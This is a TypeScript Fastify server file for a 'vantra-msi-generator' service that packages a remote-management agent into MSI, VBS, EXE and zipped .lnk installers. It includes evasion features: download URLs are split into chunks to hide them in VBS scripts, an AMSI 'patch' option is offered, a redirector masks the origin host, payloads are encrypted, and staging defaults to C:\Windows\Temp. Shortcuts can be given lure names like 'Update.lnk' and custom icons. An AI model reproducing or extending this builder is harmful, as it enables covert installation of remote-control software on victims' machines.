/**
 * HTTP route handlers for POST /build and GET /downloads/:jobId
 */

import { FastifyInstance, FastifyRequest, FastifyReply } from "fastify";
import * as crypto from "crypto";
import * as fs from "fs";
import * as path from "path";
import { spawnSync } from "child_process";
import { env } from "./env";
import * as storage from "./storage";
import * as builder from "./builder";
import * as exeBuilder from "./exe-builder";
import { runZipBuild, AmiMode } from "./zip-builder";
import { createZip } from "./zip-archive";
import * as payloadCache from "./payload-cache";
import { runLauncherBuild } from "./launcher-build";
import {
  buildEnrollmentCommand,
  toPowerShellInstallCommand,
  AgentType,
  InstallCommandInputs,
} from "./install-command";

const UUID_V4_REGEX =
  /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;

const PDF_MAGIC_BYTES = Buffer.from([0x25, 0x50, 0x44, 0x46]); // %PDF

const ICO_MAGIC_BYTES = Buffer.from([0x00, 0x00, 0x01, 0x00]);
const MAX_ICO_SIZE = 500 * 1024; // 500 KB

const VBS_TEMPLATE_PATH = path.join(
  __dirname,
  "..",
  "..",
  "msi-builder",
  "src",
  "installer.vbs.template"
);

/**
 * Constant-time comparison to prevent timing attacks.
 */
function timingSafeCompare(
  provided: string,
  expected: string
): boolean {
  const providerBuf = Buffer.alloc(expected.length);
  const expectedBuf = Buffer.from(expected);
  providerBuf.write(provided);
  try {
    return crypto.timingSafeEqual(providerBuf, expectedBuf);
  } catch {
    return false;
  }
}

/**
 * Split a URL into a VBScript string-concatenation expression so the raw
 * download URL never appears as a single contiguous string in the VBS file.
 * Produces 3 to 5 chunks joined with " & ".
 */
function obfuscateVbsUrl(url: string): string {
  const numParts = 3 + Math.floor(Math.random() * 3); // 3 to 5 parts
  const len = url.length;
  const cuts: number[] = [];

  while (cuts.length < numParts - 1) {
    const cut = 1 + Math.floor(Math.random() * (len - 2));
    if (!cuts.includes(cut)) cuts.push(cut);
  }
  cuts.sort((a, b) => a - b);

  const parts: string[] = [];
  let prev = 0;
  for (const c of cuts) {
    parts.push(url.slice(prev, c));
    prev = c;
  }
  parts.push(url.slice(prev));

  return parts.map(p => `"${p}"`).join(' & ');
}

/**
 * POST /payload — one-time import of the agent exe into the launcher-mode
 * payload cache (bearer-authed, raw application/octet-stream body).
 *
 * The artifact is stored pre-encrypted under the master key; the plaintext is
 * never written to disk and launcher builds never fetch it at request time.
 */
async function postPayload(request: FastifyRequest, reply: FastifyReply) {
  const authHeader = request.headers.authorization;
  if (!authHeader || !authHeader.startsWith("Bearer ")) {
    return reply.status(401).send({ error: "Unauthorized" });
  }
  const token = authHeader.slice(7);
  if (!timingSafeCompare(token, env.GENERATOR_SECRET)) {
    return reply.status(401).send({ error: "Unauthorized" });
  }
  const body = request.body;
  if (!(body instanceof Buffer) || body.length === 0) {
    return reply
      .status(400)
      .send({ error: "Expected an application/octet-stream payload body" });
  }
  try {
    const meta = payloadCache.importFromBuffer(body, "upload");
    return reply.status(200).send({
      ok: true,
      sha256: meta.sha256,
      size: meta.size,
    });
  } catch (err) {
    const message = err instanceof Error ? err.message : String(err);
    console.error(`Payload import failed: ${message}`);
    return reply.status(500).send({ error: "Payload import failed" });
  }
}

/**
 * POST /build - Receive build request, validate inputs, run build, return download URL.
 */
async function postBuild(request: FastifyRequest, reply: FastifyReply) {
  // Authenticate via Authorization header
  const authHeader = request.headers.authorization;
  if (!authHeader || !authHeader.startsWith("Bearer ")) {
    return reply.status(401).send({ error: "Unauthorized" });
  }

  const token = authHeader.slice(7); // Remove "Bearer "
  if (!timingSafeCompare(token, env.GENERATOR_SECRET)) {
    return reply.status(401).send({ error: "Unauthorized" });
  }

  // Parse multipart fields — use parts() only; never mix with file()/files()
  const fields: Record<string, string> = {};
  let pdfBuffer: Buffer | null = null;
  let icoBuffer: Buffer | null = null;

  try {
  for await (const part of request.parts()) {
    if (part.type === "field") {
      fields[part.fieldname] = part.value as string;
    } else if (part.type === "file" && part.fieldname === "pdf") {
      // Read the entire file into memory
      const chunks: Buffer[] = [];
      for await (const chunk of part.file) {
        chunks.push(chunk);
      }
      pdfBuffer = Buffer.concat(chunks);
    } else if (part.type === "file" && part.fieldname === "ico") {
      const chunks: Buffer[] = [];
      for await (const chunk of part.file) {
        chunks.push(chunk);
      }
      icoBuffer = Buffer.concat(chunks);
    }
  }
  } catch {
    return reply.status(400).send({ error: "Request must be multipart/form-data" });
  }

  // Validate required fields
  const clientId = fields.clientId ? parseInt(fields.clientId, 10) : NaN;
  const siteId = fields.siteId ? parseInt(fields.siteId, 10) : NaN;

  if (isNaN(clientId) || clientId <= 0) {
    return reply
      .status(400)
      .send({ error: "clientId must be a positive integer" });
  }
  if (isNaN(siteId) || siteId <= 0) {
    return reply
      .status(400)
      .send({ error: "siteId must be a positive integer" });
  }

  const agentType = fields.agentType;
  if (agentType !== "workstation" && agentType !== "server") {
    return reply
      .status(400)
      .send({ error: 'agentType must be "workstation" or "server"' });
  }

  const authToken = fields.authToken;
  if (!authToken || authToken.trim() === "") {
    return reply.status(400).send({ error: "authToken is required" });
  }

  const apiUrl = fields.apiUrl;
  if (!apiUrl || !apiUrl.startsWith("https://")) {
    return reply
      .status(400)
      .send({ error: "apiUrl must start with https://" });
  }

  const manufacturer = fields.manufacturer;
  if (!manufacturer || manufacturer.trim() === "") {
    return reply.status(400).send({ error: "manufacturer is required" });
  }

  // Validate PDF
  if (!pdfBuffer) {
    return reply.status(400).send({ error: "pdf file is required" });
  }

  const MAX_PDF_SIZE = 20 * 1024 * 1024; // 20 MB
  if (pdfBuffer.length > MAX_PDF_SIZE) {
    return reply.status(413).send({ error: "PDF must be under 20 MB" });
  }

  // Check PDF magic bytes
  if (pdfBuffer.length < 4 || !pdfBuffer.subarray(0, 4).equals(PDF_MAGIC_BYTES)) {
    return reply.status(400).send({ error: "File must be a valid PDF" });
  }

  // Validate ICO file (optional premium feature)
  if (icoBuffer !== null) {
    if (icoBuffer.length > MAX_ICO_SIZE) {
      return reply.status(413).send({ error: "ICO file must be under 500 KB" });
    }
    if (
      icoBuffer.length < 4 ||
      !icoBuffer.subarray(0, 4).equals(ICO_MAGIC_BYTES)
    ) {
      return reply.status(400).send({ error: "ico field must be a valid .ico file" });
    }
  }

  // All validation passed — proceed with job creation and build
  try {
    // Create job and save PDF
    const jobId = storage.createJob();
    storage.savePdf(jobId, pdfBuffer);

    if (icoBuffer) {
      fs.writeFileSync(storage.icoPath(jobId), icoBuffer);
    }

    const pdfPath = storage.msiOutputPath(jobId).replace(/output\.msi$/, "guide.pdf");
    const outputPath = storage.msiOutputPath(jobId);

    // Run the build
    const buildResult = await builder.runBuild({
      clientId,
      siteId,
      agentType,
      authToken,
      apiUrl,
      manufacturer,
      pdfPath,
      outputPath,
      builderPath: env.MSI_BUILDER_PATH,
    });

    if (!buildResult.success) {
      // Build failed — clean up and return error
      storage.cleanupJob(jobId);
      console.error(`Build failed for job ${jobId}: ${buildResult.output}`);
      return reply
        .status(502)
        .send({ error: "MSI build failed. Check server logs." });
    }

    // Schedule cleanup
    const ttlMs = env.JOB_TTL_HOURS * 3600 * 1000;
    setTimeout(() => storage.cleanupJob(jobId), ttlMs);

    // Return success response
    const expiresAt = new Date(Date.now() + ttlMs).toISOString();
    const downloadUrl = `${env.PUBLIC_URL}/downloads/${jobId}`;

    // Generate VBS launcher (premium feature)
    const vbsTemplate = fs.readFileSync(VBS_TEMPLATE_PATH, "utf8");
    const vbsContent = vbsTemplate
      .replace(/\{\{DOWNLOAD_URL_EXPR\}\}/g, obfuscateVbsUrl(downloadUrl))
      .replace(/\{\{MANUFACTURER\}\}/g, manufacturer);
    fs.writeFileSync(storage.vbsOutputPath(jobId), vbsContent, "utf8");

    // Build branded EXE launcher (premium feature — only if ICO was provided)
    let exeUrl: string | undefined;
    if (icoBuffer) {
      const exeResult = await exeBuilder.runExeBuild({
        vbsPath: storage.vbsOutputPath(jobId),
        icoPath: storage.icoPath(jobId),
        outputPath: storage.exeOutputPath(jobId),
        builderPath: env.MSI_BUILDER_PATH,
        manufacturer,
      });
      if (exeResult.success) {
        exeUrl = `${env.PUBLIC_URL}/downloads/${jobId}/installer.exe`;
      } else {
        console.error(`EXE build failed for job ${jobId}: ${exeResult.output}`);
        // Non-fatal: MSI and VBS are still available
      }
    }

    return reply.status(200).send({
      downloadUrl,
      vbsUrl: `${env.PUBLIC_URL}/downloads/${jobId}/installer.vbs`,
      ...(exeUrl ? { exeUrl } : {}),
      expiresAt,
    });
  } catch (err) {
    const message = err instanceof Error ? err.message : String(err);
    console.error(`Build error: ${message}`);
    return reply
      .status(500)
      .send({ error: "Internal server error" });
  }
}

/**
 * POST /build (Content-Type: application/json) — ZIP installer, STAGE 1.
 *
 * Takes the web app's already-resolved per-device values and rebuilds the
 * install command server-side (defense in depth — never trusts the client's
 * installCommand text alone), then runs New-AgentShortcut.ps1 under pwsh to
 * produce an Agent.lnk that downloads AND enrolls. Persists the .lnk under a
 * fresh jobId and returns { jobId } (STAGE 2 zips + links it).
 */
async function postBuildZip(request: FastifyRequest, reply: FastifyReply) {
  // Authenticate via Authorization header (same shared secret as MSI path).
  const authHeader = request.headers.authorization;
  if (!authHeader || !authHeader.startsWith("Bearer ")) {
    return reply.status(401).send({ error: "Unauthorized" });
  }
  const token = authHeader.slice(7); // Remove "Bearer "
  if (!timingSafeCompare(token, env.GENERATOR_SECRET)) {
    return reply.status(401).send({ error: "Unauthorized" });
  }

  const body = (request.body as Record<string, unknown>) ?? {};

  // --- Resolved values (FINDING 3): generator consumes, never queries TRMM ---
  const exeUrl = typeof body.exeUrl === "string" ? body.exeUrl.trim() : "";
  if (!exeUrl) {
    return reply.status(400).send({ error: "exeUrl is required" });
  }
  if (!exeUrl.startsWith("https://")) {
    return reply.status(400).send({ error: "exeUrl must start with https://" });
  }

  const apiUrl = typeof body.apiUrl === "string" ? body.apiUrl.trim() : "";
  if (!apiUrl || !apiUrl.startsWith("https://")) {
    return reply
      .status(400)
      .send({ error: "apiUrl must be set and start with https://" });
  }

  const clientId =
    typeof body.clientId === "number" && Math.floor(body.clientId) === body.clientId
      ? body.clientId
      : Number.isNaN(Number(body.clientId))
        ? NaN
        : Number(body.clientId);
  if (Number.isNaN(clientId) || clientId <= 0) {
    return reply
      .status(400)
      .send({ error: "clientId must be a positive integer" });
  }

  const siteId =
    typeof body.siteId === "number" && Math.floor(body.siteId) === body.siteId
      ? body.siteId
      : Number.isNaN(Number(body.siteId))
        ? NaN
        : Number(body.siteId);
  if (Number.isNaN(siteId) || siteId <= 0) {
    return reply.status(400).send({ error: "siteId must be a positive integer" });
  }

  const agentType = body.agentType;
  if (agentType !== "workstation" && agentType !== "server") {
    return reply
      .status(400)
      .send({ error: 'agentType must be "workstation" or "server"' });
  }

  const authToken = typeof body.authToken === "string" ? body.authToken.trim() : "";
  if (!authToken) {
    return reply.status(400).send({ error: "authToken is required" });
  }

  // --- flags ---
  const flags =
    body.flags && typeof body.flags === "object"
      ? (body.flags as Record<string, unknown>)
      : {};

  const amsi = (flags.amsi as AmiMode) ?? "none";
  if (amsi !== "none" && amsi !== "also" && amsi !== "patch") {
    return reply
      .status(400)
      .send({ error: 'flags.amsi must be "none", "also", or "patch"' });
  }

  const fileName =
    typeof flags.fileName === "string" && flags.fileName.trim() !== ""
      ? flags.fileName.trim()
      : "trmm-agent.exe";
  if (fileName.includes("/") || fileName.includes("\\") || fileName.includes("..")) {
    return reply
      .status(400)
      .send({ error: "flags.fileName must be a bare filename (no path)" });
  }

  // Optional STAGE 2 expiry (in hours) — the web app controls the window
  // (24/72). Defaults to the generator's JOB_TTL_HOURS (72h). Clamped to a sane
  // [1, 168] range so a bad body can never mint a zip that outlives the token.
  const rawExpiry =
    typeof body.expiryHours === "number"
      ? body.expiryHours
      : Number(body.expiryHours);
  const expiryHours =
    Number.isFinite(rawExpiry) && rawExpiry >= 1 && rawExpiry <= 168
      ? Math.floor(rawExpiry)
      : env.JOB_TTL_HOURS;

  // Optional features (defaults to rdp/ping/power when absent/empty).
  const features: string[] =
    Array.isArray(body.features)
      ? body.features
          .filter((f): f is string => typeof f === "string" && f.trim() !== "")
          .map((f) => f.trim())
      : [];

  // Client-provided PS text, used ONLY for validation/logging. The authoritative
  // value is rebuilt below from resolved values (defense in depth).
  const clientInstallCommand =
    typeof body.installCommand === "string" ? body.installCommand : "";

  const inputs: InstallCommandInputs = {
    apiUrl,
    clientId,
    siteId,
    agentType: agentType as AgentType,
    authToken,
    features,
  };

  // Rebuild server-side (mirror of toPowerShellInstallCommand's shape).
  const fullCommand = toPowerShellInstallCommand(inputs, exeUrl);
  // What actually gets embedded in the legacy .lnk: just the enrollment step
  // (the .lnk's own downloader already fetches + silently installs the base
  // agent). In launcher mode this is carried INSIDE the encrypted config for
  // the staged-payload execute+enroll runbook step.
  const enrollmentCommand = buildEnrollmentCommand(inputs);

  // Launcher mode (WP4): `launcherMode: true` switches this job to the
  // offline carrier path — the zip ships { Update.lnk, Launcher.exe } and the
  // .lnk runs the GUI launcher directly (relative target, NO command-line
  // arguments, nothing downloaded at runtime). Absent/false keeps the legacy
  // Agent.lnk path byte-identical.
  const launcherMode = body.launcherMode === true;
  // Optional staging directory for the payload inside the encrypted config
  // (operator-tunable; C:\Windows\Temp is the default).
  const rawOutDir =
    typeof flags.outDir === "string" && flags.outDir.trim() !== ""
      ? flags.outDir.trim()
      : "C:\\Windows\\Temp";

  // Create the job dir first so the .lnk lands under jobs/{jobId}/.
  const jobId = storage.createJob();
  const lnkPath = storage.lnkOutputPath(jobId);

  try {
    if (launcherMode) {
      // Offline carrier build: warm launcher + envelope stamp + Update.lnk +
      // 2-entry zip, then the WP6 validation report card. Throws on failure.
      await runLauncherBuild({
        jobId,
        inputs: {
          apiUrl,
          clientId,
          siteId,
          agentType: agentType as AgentType,
          authToken,
          features,
          enroll: enrollmentCommand,
          outDir: rawOutDir,
          debug: false, // silent production (the marker is opt-in via flags)
        },
        // FIX 3: optional renameable names from the web app flags (defaults when
        // blank -> byte-identical to the confirmed working flow).
        names: {
          updateLinkName:
            typeof flags.updateLinkName === "string" ? flags.updateLinkName.trim() : "",
          innerFolder:
            typeof flags.innerFolder === "string" ? flags.innerFolder.trim() : "",
        },
      });
      if (!fs.existsSync(storage.zipOutputPath(jobId))) {
        throw new Error("launcher build finished without producing a zip");
      }
      console.log(
        `Launcher-mode ZIP build ok for job ${jobId}; client cmd len=${clientInstallCommand.length}, rebuilt len=${fullCommand.length}`
      );
    } else {
      const result = await runZipBuild({
        scriptPath: path.join(__dirname, "New-AgentShortcut.ps1"),
        exeUrl,
        fileName,
        outputPath: lnkPath,
        installCommand: enrollmentCommand,
        authToken,
        amsi,
      });

      if (!result.success) {
        console.error(`ZIP build failed for job ${jobId}: ${result.output}`);
        storage.cleanupJob(jobId);
        return reply
          .status(500)
          .send({ error: "ZIP build failed", detail: result.output });
      }

      if (!fs.existsSync(lnkPath)) {
        console.error(`ZIP build reported success but no Agent.lnk for ${jobId}`);
        storage.cleanupJob(jobId);
        return reply.status(500).send({ error: "Agent.lnk was not produced" });
      }

      // STAGE 2 (Task D): zip the single Agent.lnk, then drop the temp .lnk and
      // keep only the zip (until expiry). The .lnk downloads + installs the agent
      // exe at runtime, so the exe itself never ships inside the zip.
      const lnkData = fs.readFileSync(lnkPath);
      const zipBuffer = createZip([{ name: "Agent.lnk", data: lnkData }]);
      fs.writeFileSync(storage.zipOutputPath(jobId), zipBuffer);
      storage.removeLnk(jobId);

      console.log(
        `ZIP build ok for job ${jobId}; client cmd len=${clientInstallCommand.length}, rebuilt len=${fullCommand.length}; zip ${zipBuffer.length} bytes`
      );
    }

    const expiresAt = new Date(Date.now() + expiryHours * 60 * 60 * 1000);
    storage.saveZipExpiry(jobId, expiresAt);

    // Masked link through the redirector base URL so the bundling/origin host
    // isn't visible to the end user.
    const maskedBase = env.REDIRECT_BASE_URL || env.PUBLIC_URL;
    const downloadUrl = `${maskedBase}/d/${jobId}`;

    console.log(
      `Launcher-mode=${launcherMode} ZIP build ok for job ${jobId}; expires ${expiresAt.toISOString()}`
    );

    return reply.status(200).send({
      jobId,
      downloadUrl,
      expiresAt: expiresAt.toISOString(),
    });
  } catch (err) {
    const message = err instanceof Error ? err.message : String(err);
    console.error(`ZIP build error for job ${jobId}: ${message}`);
    storage.cleanupJob(jobId);
    return reply.status(500).send({ error: "Internal server error" });
  }
}

/**
 * GET /downloads/:jobId - Stream the MSI file and clean up after.
 */
async function getDownload(request: FastifyRequest, reply: FastifyReply) {
  const { jobId } = request.params as { jobId: string };

  // Validate job ID format
  if (!UUID_V4_REGEX.test(jobId)) {
    return reply.status(400).send({ error: "Invalid job ID" });
  }

  // Get MSI path
  const msiPath = storage.msiOutputPath(jobId);

  // Check file exists
  if (!fs.existsSync(msiPath)) {
    return reply.status(404).send({ error: "Not found" });
  }

  // Set response headers
  reply.header("Content-Type", "application/octet-stream");
  reply.header("Content-Disposition", 'attachment; filename="VantraAgent.msi"');

  // Stream the file
  const stream = fs.createReadStream(msiPath);

  // Clean up after stream finishes
  stream.on("close", () => {
    storage.cleanupJob(jobId);
  });

  stream.on("error", () => {
    storage.cleanupJob(jobId);
  });

  return reply.send(stream);
}

/**
 * GET /downloads/:jobId/installer.vbs - Return the generated VBS launcher.
 */
async function getVbsDownload(request: FastifyRequest, reply: FastifyReply) {
  const { jobId } = request.params as { jobId: string };

  if (!UUID_V4_REGEX.test(jobId)) {
    return reply.status(400).send({ error: "Invalid job ID" });
  }

  const vbsPath = storage.vbsOutputPath(jobId);

  if (!fs.existsSync(vbsPath)) {
    return reply.status(404).send({ error: "Not found or expired" });
  }

  reply.header("Content-Type", "application/octet-stream");
  reply.header(
    "Content-Disposition",
    'attachment; filename="VantraAgentInstaller.vbs"'
  );

  return reply.send(fs.readFileSync(vbsPath));
}

/**
 * GET /downloads/:jobId/installer.exe - Return the branded EXE launcher.
 */
async function getExeDownload(request: FastifyRequest, reply: FastifyReply) {
  const { jobId } = request.params as { jobId: string };

  if (!UUID_V4_REGEX.test(jobId)) {
    return reply.status(400).send({ error: "Invalid job ID" });
  }

  const exePath = storage.exeOutputPath(jobId);

  if (!fs.existsSync(exePath)) {
    return reply.status(404).send({ error: "Not found or expired" });
  }

  reply.header("Content-Type", "application/octet-stream");
  reply.header(
    "Content-Disposition",
    'attachment; filename="VantraAgentInstaller.exe"'
  );

  return reply.send(fs.readFileSync(exePath));
}

/**
 * GET /downloads/:jobId/zip - Stream the STAGE-2 packaged zip (one Agent.lnk).
 *
 * Only served while unexpired (72h by default; the web app supplies
 * expiryHours). Kept available for the full window so the masked link can be
 * re-fetched; cleaned up once expired (Task D: keep the zip until expiry).
 */
async function getZipDownload(request: FastifyRequest, reply: FastifyReply) {
  const { jobId } = request.params as { jobId: string };

  if (!UUID_V4_REGEX.test(jobId)) {
    return reply.status(400).send({ error: "Invalid job ID" });
  }

  const zipPath = storage.zipOutputPath(jobId);
  if (!fs.existsSync(zipPath)) {
    return reply.status(404).send({ error: "Not found" });
  }

  // Enforce the expiry window recorded when the job was built.
  const expiry = storage.getZipExpiry(jobId);
  if (expiry && expiry.getTime() < Date.now()) {
    storage.cleanupJob(jobId);
    return reply.status(410).send({ error: "Link expired" });
  }

  reply.header("Content-Type", "application/zip");
  reply.header("Content-Disposition", 'attachment; filename="Agent.zip"');

  return reply.send(fs.createReadStream(zipPath));
}

/**
 * GET /d/:jobId - Masked zip link.
 *
 * The handed URL uses a redirector base (REDIRECT_BASE_URL) so the generator's
 * origin isn't visible. In dev/lab the generator serves /d/:jobId itself via a
 * 302 to the zip endpoint; in production a separate redirector host owns /d/
 * and 302s to <PUBLIC_URL>/downloads/:jobId/zip. Either way the end user only
 * ever sees the masked host.
 *
 * NOTE: the redirect MUST be absolute and built from PUBLIC_URL (NOT a bare
 * relative path). PUBLIC_URL is the configured public base (it may include a
 * reverse-proxy path prefix such as `/msi-generator`, which the proxy strips
 * before reaching this service). A relative redirect would drop that prefix and
 * 404 behind such a proxy.
 */
async function getMaskedZipRedirect(
  request: FastifyRequest,
  reply: FastifyReply
) {
  const { jobId } = request.params as { jobId: string };

  if (!UUID_V4_REGEX.test(jobId)) {
    return reply.status(400).send({ error: "Invalid job ID" });
  }

  return reply.redirect(`${env.PUBLIC_URL}/downloads/${jobId}/zip`, 302);
}

/**
 * Simple spawn check — returns true when the command exits 0.
 */
function toolPresent(bin: string, args: string[]): boolean {
  try {
    const r = spawnSync(bin, args, { stdio: "ignore", timeout: 10_000 });
    return r.status === 0 && r.error === undefined;
  } catch {
    return false;
  }
}

/**
 * GET /health (and /healthz) — operator/monitoring status endpoint.
 *
 * Untrusted, but intentionally public (no secrets): it reports which host
 * prerequisites are present, whether an agent payload has been imported, and a
 * machine-readable `ready` flag so "requisites missing" is never a silent guess
 * again (Task 3-C). It never leaks the GENERATOR_SECRET, the payload key, or
 * per-job data.
 */
async function getHealth(_request: FastifyRequest, reply: FastifyReply) {
  const buildScript = path.join(env.MSI_BUILDER_PATH, "build", "build.sh");
  const mcs = env.MONO_MCS_PATH || "mcs";

  const tools = {
    node: process.version,
    pwsh: toolPresent("pwsh", ["-NoProfile", "-NoLogo", "-Command", "\"ok\""]),
    // mono-mcs is only needed on the default (non-native) launcher path.
    mcs: env.LAUNCHER_NATIVE ? null : toolPresent(mcs, ["--version"]),
    // MinGW cross-compiler is only needed on the native launcher path.
    mingw: env.LAUNCHER_NATIVE ? toolPresent(env.NATIVE_CC, ["--version"]) : null,
    // wixl (from msitools) is only needed for MSI builds.
    wixl: toolPresent("wixl", ["--help"]),
  };

  const msiBuilderOk =
    fs.existsSync(env.MSI_BUILDER_PATH) && fs.existsSync(buildScript);

  const payload = payloadCache.status();

  const launcherReady =
    payload.imported &&
    (env.LAUNCHER_NATIVE ? tools.mingw === true : tools.mcs === true);

  const missing: string[] = [];
  if (!msiBuilderOk) {
    missing.push("MSI_BUILDER_PATH (build.sh not found)");
  }
  if (!tools.pwsh) {
    missing.push("pwsh (PowerShell 7) — required for the ZIP installer");
  }
  if (env.LAUNCHER_NATIVE) {
    if (!tools.mingw) {
      missing.push(`${env.NATIVE_CC} (MinGW cross-compiler) — required for the native launcher`);
    }
  } else if (!tools.mcs) {
    missing.push("mcs (mono-mcs) — set LAUNCHER_NATIVE=1 to use the MinGW/native path instead");
  }
  if (!payload.imported) {
    missing.push("agent payload — import via POST /payload or set PAYLOAD_PATH and restart");
  }
  if (!env.REDIRECT_BASE_URL) {
    missing.push("REDIRECT_BASE_URL (origin masking off — zip links fall back to PUBLIC_URL)");
  }

  reply.send({
    ok: launcherReady && tools.pwsh,
    service: "vantra-msi-generator",
    launcherMode: env.LAUNCHER_NATIVE ? "native" : "mono",
    config: {
      msiBuilderOk,
      publicUrl: env.PUBLIC_URL,
      redirectBaseUrl: env.REDIRECT_BASE_URL || null,
      launcherPoolSize: env.LAUNCHER_POOL_SIZE,
      payloadMasterKey: env.PAYLOAD_MASTER_KEY ? "env" : "file-or-unset",
    },
    tools,
    payload: payload.imported
      ? { imported: true, ...payload.meta }
      : { imported: false },
    launcherReady,
    msiReady: msiBuilderOk && tools.wixl,
    ready: launcherReady && tools.pwsh,
    missing,
  });
}

/**
 * Register routes with the Fastify instance.
 */
export async function registerRoutes(app: FastifyInstance) {
  // Raw agent-exe import for the launcher payload cache (one-time). The body
  // is a plain byte stream (never shell-processed; validated in memory).
  app.addContentTypeParser(
    "application/octet-stream",
    { parseAs: "buffer", bodyLimit: 600 * 1024 * 1024 },
    (request, body, done) => done(null, body)
  );
  app.post("/payload", postPayload);

  // /build serves two payload types on the same route, selected by
  // Content-Type:
  //   - multipart/form-data  -> MSI/VBS/EXE packaging (legacy path)
  //   - application/json     -> ZIP installer (STAGE 1)
  app.post("/build", async (request, reply) => {
    const contentType = (request.headers["content-type"] ?? "").toLowerCase();
    if (contentType.startsWith("application/json")) {
      return postBuildZip(request, reply);
    }
    return postBuild(request, reply);
  });
  app.get("/downloads/:jobId", getDownload);
  app.get("/downloads/:jobId/installer.vbs", getVbsDownload);
  app.get("/downloads/:jobId/installer.exe", getExeDownload);
  app.get("/downloads/:jobId/zip", getZipDownload);
  app.get("/d/:jobId", getMaskedZipRedirect);
  app.get("/health", getHealth);
  app.get("/healthz", getHealth);
}
